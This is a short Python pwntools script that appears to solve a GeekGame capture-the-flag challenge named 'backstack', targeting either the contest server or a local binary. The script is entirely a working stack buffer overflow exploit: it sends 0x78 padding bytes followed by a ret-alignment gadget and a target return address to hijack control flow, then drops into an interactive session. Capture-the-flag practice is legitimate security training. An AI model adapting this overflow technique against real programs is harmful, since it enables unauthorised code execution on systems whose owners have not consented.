from pwn import *
from sys import argv
context.log_level = 'debug'

if 'r' in argv:
    conn = remote('prob10.geekgame.pku.edu.cn', 10010)
    conn.sendlineafter(b'Please input your token: ', b'')
else:
    context.terminal = ['tmux','splitw','-h']
    conn = process('backstack/challenge1')
    # gdb.attach(pidof(conn)[0], 'b *get_line')

conn.sendlineafter(b'included!)\n', b'0')
# 16B alignment!!!
conn.sendlineafter(b'string:\n', b'A'*(0x78) + p64(0x4011d3) + p64(0x4011b6))


conn.interactive()